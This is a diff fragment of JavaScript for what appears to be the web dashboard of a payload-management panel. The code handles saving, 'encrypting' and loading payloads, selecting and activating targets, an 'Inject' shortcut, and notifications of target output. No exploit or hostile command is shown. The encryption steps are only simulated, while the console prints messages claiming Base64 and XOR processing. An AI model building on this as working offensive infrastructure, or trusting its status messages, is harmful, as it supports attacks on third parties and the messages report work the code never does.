+                        }
+                    } catch (error) {
+                        this.addConsoleOutput('[ERROR] Failed to save encrypted payload', 'error');
+                    }
+                }, 1500);
+                
+            } catch (error) {
+                this.addConsoleOutput(`[ERROR] Encryption failed: ${error.message}`, 'error');
+            }
+        }
+        
+        async decodeFile() {
+            if (!this.currentFile) {
+                this.addConsoleOutput('[ERROR] Select payload first', 'error');
+                return;
+            }
+            
+            if (!this.isEncrypted) {
+                this.addConsoleOutput('[INFO] Payload is not encrypted', 'info');
+                return;
+            }
+            
+            if (!this.editor) return;
+            
+            const content = this.editor.value;
+            if (!content.trim()) {
+                this.addConsoleOutput('[ERROR] Cannot decode empty payload', 'error');
+                return;
+            }
+            
+            this.addConsoleOutput('[DECODE] Initializing decryption sequence...', 'warning');
+            
+            try {
+                // Simulate decryption process
+                setTimeout(() => {
+                    this.addConsoleOutput('[DECODE] Decoding Base64...', 'info');
+                }, 500);
+                
+                setTimeout(() => {
+                    this.addConsoleOutput('[DECODE] Applying XOR decryption...', 'info');
+                }, 1000);
+                
+                setTimeout(async () => {
+                    // Save the decrypted content
+                    try {
+                        const result = await this.saveFile(this.currentFile);
+                        if (result && result.success) {
+                            this.addConsoleOutput('[SUCCESS] Payload decrypted and saved successfully', 'success');
+                            this.isEncrypted = false;
+                            if (this.encryptionStatus) this.encryptionStatus.textContent = 'ENCRYPTION: DISABLED';
+                        }
+                    } catch (error) {
+                        this.addConsoleOutput('[ERROR] Failed to save decrypted payload', 'error');
+                    }
+                }, 1500);
+                
+            } catch (error) {
+                this.addConsoleOutput(`[ERROR] Decryption failed: ${error.message}`, 'error');
+            }
+        }
+        
+        addConsoleOutput(message, type = 'info') {
+            if (!this.consoleOutput) return;
+            
+            const line = document.createElement('div');
+            line.className = `console-line ${type}`;
+            
+            // Add timestamp
+            const now = new Date();
+            const timestamp = `[${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}]`;
+            line.textContent = `${timestamp} ${message}`;
+            
+            this.consoleOutput.appendChild(line);
+            this.consoleOutput.scrollTop = this.consoleOutput.scrollHeight;
+        }
     }
-
-    // Initialize with typing effect
-    setTimeout(() => {
-      typeWriter(resultOutput, '>_ WAITING FOR PAYLOAD INJECTION...', 30);
-    }, 500);
-  });
+    
+    // === GLOBAL FUNCTIONS ===
+    let codeEditor;
+    
+    // Wrapper functions for backward compatibility
+    function open_list_of_inactive_pyload() {
+        if (codeEditor) codeEditor.open_list_of_inactive_pyload();
+    }
+    
+    function activateTarget(targetName) {
+        if (codeEditor) codeEditor.activateTarget(targetName);
+    }
+    
+    function closeInactivePayloadsModal() {
+        if (codeEditor) codeEditor.closeInactivePayloadsModal();
+    }
+    
+    function refreshInactivePayloads() {
+        if (codeEditor) codeEditor.refreshInactivePayloads();
+    }
+    
+    function loadPayload(fileName) {
+        if (!codeEditor) {
+            console.error('Editor not initialized');
+            return;
+        }
+        codeEditor.loadPayload(fileName);
+    }
+    
+    function newFile() {
+        if (!codeEditor) return;
+        
+        codeEditor.currentFile = null;
+        if (codeEditor.currentFileName) codeEditor.currentFileName.textContent = 'NEW_PAYLOAD';
+        if (codeEditor.editor) codeEditor.editor.value = '';
+        codeEditor.updateLineNumbers();
+        codeEditor.updateCursorPosition();
+        codeEditor.updateCharCount();
+        codeEditor.addConsoleOutput('[SYSTEM] New payload created', 'info');
+        codeEditor.addConsoleOutput('[INFO] Enter payload code below', 'info');
+        
+        // Reset file info
+        if (codeEditor.fileInfo) codeEditor.fileInfo.textContent = 'STATUS: UNSAVED';
+        if (codeEditor.filePath) codeEditor.filePath.textContent = 'LOCATION: /payloads/temp/';
+        if (codeEditor.fileSize) codeEditor.fileSize.textContent = 'SIZE: 0 BYTES';
+        if (codeEditor.fileHash) codeEditor.fileHash.textContent = 'HASH: N/A';
+        if (codeEditor.encryptionStatus) codeEditor.encryptionStatus.textContent = 'ENCRYPTION: DISABLED';
+        codeEditor.isEncrypted = false;
+    }
+    
+    function showSaveModal() {
+        if (codeEditor) codeEditor.showSaveModal();
+    }
+    
+    async function saveWithName() {
+        const input = document.getElementById('payloadNameInput');
+        if (!input) return;
+        
+        const payloadName = input.value.trim();
+        
+        if (!payloadName) {
+            alert('Please enter a payload name');
+            return;
+        }
+        
+        // Validate filename (basic validation)
+        if (!payloadName.match(/^[a-zA-Z0-9_\-\.]+$/)) {
+            alert('Invalid file name. Use only letters, numbers, dots, underscores, and hyphens.');
+            return;
+        }
+        
+        if (codeEditor) {
+            try {
+                const result = await codeEditor.saveFile(payloadName);
+                if (result && result.success) {
+                    codeEditor.closeSaveModal();
+                    
+                    // Show success notification
+                    codeEditor.addConsoleOutput(`[SUCCESS] Payload "${payloadName}" saved successfully`, 'success');
+                    
+                    // Update file info
+                    if (codeEditor.fileInfo) codeEditor.fileInfo.textContent = 'STATUS: SAVED';
+                    if (codeEditor.filePath) codeEditor.filePath.textContent = `LOCATION: /payloads/encrypted/${payloadName}`;
+                }
+            } catch (error) {
+                // Error is already shown in saveFile method
+            }
+        }
+    }
+    
+    function closeSaveModal() {
+        if (codeEditor) codeEditor.closeSaveModal();
+    }
+    
+    function useSelectedTarget() {
+        if (codeEditor) codeEditor.useSelectedTargetFromModal();
+    }
+    
+    function closeTargetModal() {
+        if (codeEditor) codeEditor.closeTargetModal();
+    }
+    
+    function closeOutputModal() {
+        if (codeEditor) codeEditor.closeOutputModal();
+    }
+    
+    function showOutputDetails(targetName) {
+        // This is now handled by the codeEditor.showOutputDetails method
+        console.warn('showOutputDetails is now handled by the codeEditor instance');
+    }
+    
+    function switchPanel(panelName) {
+        // Update active tab
+        document.querySelectorAll('.panel-tab').forEach(tab => {
+            tab.classList.remove('active');
+            if (tab.textContent.includes(panelName.toUpperCase())) {
+                tab.classList.add('active');
+            }
+        });
+        
+        // Show selected panel
+        const consolePanel = document.getElementById('consolePanel');
+        const infoPanel = document.getElementById('infoPanel');
+        const outputPanel = document.getElementById('outputPanel');
+        
+        if (consolePanel) consolePanel.style.display = panelName === 'console' ? 'block' : 'none';
+        if (infoPanel) infoPanel.style.display = panelName === 'info' ? 'block' : 'none';
+        if (outputPanel) outputPanel.style.display = panelName === 'output' ? 'block' : 'none';
+    }
+    
+    // Utility function for testing notifications
+    function testNotification() {
+        if (!codeEditor) {
+            console.error('Code editor not initialized');
+            return;
+        }
+        
+        // Test with a dummy payload
+        const testPayload = {
+            ID: 'test_' + Date.now(),
+            target_name: 'Test Target ' + Math.floor(Math.random() * 100),
+            payload_name: 'Test Payload ' + Math.floor(Math.random() * 100),
+            timestamp: new Date().toISOString(),
+            status: 'pending'
+        };
+        
+        console.log('[TEST] Adding test notification:', testPayload);
+        codeEditor.addOutputNotification(testPayload);
+    }
+    
+    // Function to clear all notifications
+    function clearAllNotifications() {
+        if (codeEditor) {
+            if (confirm('Are you sure you want to clear ALL notifications? This cannot be undone.')) {
+                codeEditor.clearAllNotificationsStorage();
+            }
+        }
+    }
+    
+    // Function to restore notifications manually
+    function restoreNotifications() {
+        if (codeEditor) {
+            codeEditor.restoreNotifications();
+            alert('Notifications have been restored from storage.');
+        }
+    }
+    
+    // Initialize the editor when DOM is loaded
+    document.addEventListener('DOMContentLoaded', () => {
+        codeEditor = new CodeEditor();
+        
+        // Set up panel switching
+        switchPanel('console');
+        
+        // Add some glitch effects randomly
+        setInterval(() => {
+            if (Math.random() > 0.7) {
+                const elements = document.querySelectorAll('.glitch');
+                elements.forEach(el => {
+                    el.style.animation = 'glitch 0.3s';
+                    setTimeout(() => {
+                        el.style.animation = '';
+                    }, 300);
+                });
+            }
+        }, 5000);
+        
+        // Add keyboard shortcut info
+        if (codeEditor) {
+            codeEditor.addConsoleOutput('[INFO] Keyboard shortcuts: Ctrl+S=Save, Ctrl+I=Inject, Ctrl+A=Show Inactive Targets, Ctrl+R=Restore Notifications', 'info');
+            codeEditor.addConsoleOutput('[INFO] Notifications are now persistent and will survive page reloads', 'success');
+        }
+    });
 </script>
 {% endblock %}
